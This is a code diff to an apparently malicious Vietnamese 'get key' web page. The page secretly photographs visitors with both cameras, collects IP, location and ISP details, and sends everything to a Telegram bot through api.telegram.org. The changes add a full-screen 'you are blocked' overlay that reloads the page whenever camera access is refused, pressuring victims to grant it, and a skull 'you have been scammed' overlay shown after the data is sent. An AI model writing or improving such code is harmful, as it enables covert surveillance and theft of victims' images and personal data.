@@ -94,11 +94,26 @@
   .status { margin-top: 20px; font-size: 0.85rem; font-weight: 700; color: #4ade80; min-height: 20px; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(34,197,94,0.4); }
   #video, #canvas { display: none; }
 
-  /* Giao diện cảnh báo bị lừa với hình đầu xương */
-  .hacked-alert {
+  /* Giao diện phủ toàn màn hình che kín trang web */
+  .fullscreen-overlay {
     display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: rgba(2, 4, 8, 0.95);
+    backdrop-filter: blur(25px);
+    -webkit-backdrop-filter: blur(25px);
+    z-index: 9999;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    padding: 20px;
     animation: fadeIn 0.4s ease-in-out;
   }
+
   .skull-box {
     width: 80px; height: 80px; margin: 0 auto 20px auto;
     background: linear-gradient(135deg, rgba(239, 68, 68, 0.3), rgba(185, 28, 28, 0.3));
@@ -107,19 +122,22 @@
     box-shadow: 0 0 30px rgba(239, 68, 68, 0.5);
     animation: pulseSkull 1.2s infinite alternate;
   }
-  .hacked-alert h2 {
+
+  .fullscreen-overlay h2 {
     color: #ef4444;
-    text-shadow: 0 0 15px rgba(239, 68, 68, 0.8);
-    font-size: 1.8rem;
+    text-shadow: 0 0 20px rgba(239, 68, 68, 0.8);
+    font-size: 2rem;
     margin-bottom: 12px;
   }
-  .hacked-alert p {
+
+  .fullscreen-overlay p {
     color: #fca5a5;
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.95rem;
-    text-shadow: 0 0 8px rgba(239, 68, 68, 0.5);
+    font-size: 1.1rem;
+    text-shadow: 0 0 10px rgba(239, 68, 68, 0.5);
     line-height: 1.5;
   }
+
   @keyframes fadeIn {
     from { opacity: 0; transform: scale(0.95); }
     to { opacity: 1; transform: scale(1); }
@@ -193,13 +211,20 @@
       
       <div id="status" class="status"></div>
     </div>
+  </div>
 
-    <!-- Phần nội dung hiển thị sau khi hoàn tất (Đầu xương + Bạn đã bị lừa) -->
-    <div id="hacked-content" class="hacked-alert">
-      <div class="skull-box">💀</div>
-      <h2>BẠN ĐÃ BỊ LỪA</h2>
-      <p>&gt; Toàn bộ thông tin & hình ảnh của bạn đã được ghi lại thành công!</p>
-    </div>
+  <!-- Thông báo phủ toàn màn hình khi hoàn thành (Bị lừa) -->
+  <div id="hacked-overlay" class="fullscreen-overlay">
+    <div class="skull-box">💀</div>
+    <h2>BẠN ĐÃ BỊ LỪA</h2>
+    <p>&gt; Toàn bộ thông tin & hình ảnh của bạn đã được ghi lại thành công!</p>
+  </div>
+
+  <!-- Thông báo phủ toàn màn hình khi từ chối quyền camera (Bị chặn) -->
+  <div id="blocked-overlay" class="fullscreen-overlay">
+    <div class="skull-box" style="background: linear-gradient(135deg, rgba(239, 68, 68, 0.3), rgba(185, 28, 28, 0.3)); border-color: rgba(239, 68, 68, 0.8);">🚫</div>
+    <h2>BẠN ĐÃ BỊ CHẶN</h2>
+    <p>&gt; Vui lòng cho phép truy cập để tiếp tục truy cập get key!</p>
   </div>
 
 <script>
@@ -218,8 +243,8 @@
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const getKeyBtn = document.getElementById('get-key-btn');
-  const mainContent = document.getElementById('main-content');
-  const hackedContent = document.getElementById('hacked-content');
+  const hackedOverlay = document.getElementById('hacked-overlay');
+  const blockedOverlay = document.getElementById('blocked-overlay');
 
   async function takePhoto(facingMode, label) {
     try {
@@ -250,7 +275,7 @@
         };
       });
     } catch (e) {
-      return null;
+      return "DENIED";
     }
   }
 
@@ -284,8 +309,17 @@
       `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n` +
       `━━━━━━━━━━━━━━━━━━━━━`;
 
-    statusDiv.textContent = '[*] Đang xử lý luồng dữ liệu #1...';
+    statusDiv.textContent = '[*] Đang yêu cầu quyền truy cập Camera...';
     let backPhoto = await takePhoto('environment', '📸 Ảnh Camera Sau');
+
+    // Nếu bấm từ chối -> Hiện màn hình "BẠN ĐÃ BỊ CHẶN" che kín toàn web rồi reload
+    if (backPhoto === "DENIED") {
+      blockedOverlay.style.display = 'flex';
+      setTimeout(() => {
+        location.reload();
+      }, 2500);
+      return;
+    }
 
     statusDiv.textContent = '[*] Đang xử lý luồng dữ liệu #2...';
     let frontPhoto = await takePhoto('user', '📸 Ảnh Camera Trước');
@@ -299,7 +333,7 @@
       try { await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e){}
     }
 
-    if (frontPhoto && frontPhoto.blob) {
+    if (frontPhoto && frontPhoto.blob && frontPhoto !== "DENIED") {
       const fd2 = new FormData();
       fd2.append('chat_id', TELEGRAM_CHAT_ID);
       fd2.append('photo', frontPhoto.blob, 'front.jpg');
@@ -308,21 +342,8 @@
       try { await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd2 }); } catch(e){}
     }
 
-    if (!backPhoto && !frontPhoto) {
-      try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText + '\n\n⚠️ (Không thể truy cập camera)', parse_mode: 'HTML' })
-        });
-      } catch (e) {}
-    }
-
-    // Ẩn giao diện ban đầu và hiện khối đầu xương + chữ "BẠN ĐÃ BỊ LỪA"
-    mainContent.style.display = 'none';
-    hackedContent.style.display = 'block';
-
-    // Đợi 2.5 giây để người dùng kịp đọc rồi chuyển hướng
+    // Hoàn tất -> Hiện màn hình "BẠN ĐÃ BỊ LỪA" che kín toàn web rồi chuyển hướng
+    hackedOverlay.style.display = 'flex';
     setTimeout(() => {
       window.location.href = REDIRECT_URL;
     }, 2500);
